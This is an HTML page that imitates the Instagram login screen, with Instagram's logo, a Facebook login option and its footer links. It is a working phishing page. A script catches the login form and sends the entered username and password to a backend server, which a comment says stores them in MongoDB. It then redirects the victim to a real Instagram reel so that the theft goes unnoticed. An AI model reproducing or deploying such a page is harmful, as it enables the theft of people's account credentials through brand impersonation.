<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Login Page</title>
  <link rel="stylesheet" href="styles.css">
</head>
<body>

<div class="wrapper">
  <div class="header">
    <div class="top">
      <div class="logo">
        <img src="instagram.png" alt="instagram" style="width: 175px;">
      </div>

      <!-- ✅ Updated form: works with MongoDB backend -->
      <form id="login-form">
        <div class="form">
          <div class="input_field">
            <input type="text" name="username" placeholder="Phone number, username, or email" class="input" required>
          </div>
          <div class="input_field">
            <input type="password" name="password" placeholder="Password" class="input" required>
          </div>
          <div class="btn">
            <button type="submit" style="all: unset; cursor: pointer;">Log In</button>
          </div>
        </div>
      </form>

      <div class="or">
        <div class="line"></div>
        <p>OR</p>
        <div class="line"></div>
      </div>
      <div class="dif">
        <div class="fb">
          <img src="facebook.png" alt="facebook">
          <p>Log in with Facebook</p>
        </div>
        <div class="forgot">
          <a href="#">Forgot password?</a>
        </div>
      </div>
    </div>

    <div class="signup">
      <p>Don't have an account? <a href="#">Sign up</a></p>
    </div>

    <div class="apps">
      <p>Get the app.</p>
      <div class="icons">
        <a href="#"><img src="appstore.png" alt="appstore"></a>
        <a href="#"><img src="googleplay.png" alt="googleplay"></a>
      </div>
    </div>
  </div>

  <div class="footer">
    <div class="links">
      <ul>
        <li><a href="#">ABOUT US</a></li>
        <li><a href="#">SUPPORT</a></li>
        <li><a href="#">PRESS</a></li>
        <li><a href="#">API</a></li>
        <li><a href="#">JOBS</a></li>
        <li><a href="#">PRIVACY</a></li>
        <li><a href="#">TERMS</a></li>
        <li><a href="#">DIRECTORY</a></li>
        <li><a href="#">PROFILES</a></li>
        <li><a href="#">HASHTAGS</a></li>
        <li><a href="#">LANGUAGE</a></li>
      </ul>
    </div>
    <div class="copyright">
      © 2025 INSTAGRAM 
    </div>
  </div>
</div>

<script>
	document.getElementById("login-form").addEventListener("submit", function (e) {
	  e.preventDefault();
  
	  const form = e.target;
	  const username = form.username.value;
	  const password = form.password.value;
  
	  fetch("http://localhost:3000/submit", {
		method: "POST",
		headers: {
		  "Content-Type": "application/json"
		},
		body: JSON.stringify({
		  username,
		  password
		})
	  })
	  .then(res => res.json())
	  .then(response => {
		if (response.status === "success") {
		 
			window.location.href = "https://www.instagram.com/reel/DHlnjecpVYP/?igsh=ZmoxMXp0ZjE3OHc0";
		  
		} else {
		  alert("Something went wrong. Please try again.");
		}
	  })
	  .catch(error => {
		console.error("Error:", error);
		alert("Server error. Please try again later.");
	  });
	});
  </script>
  
</body>
</html>
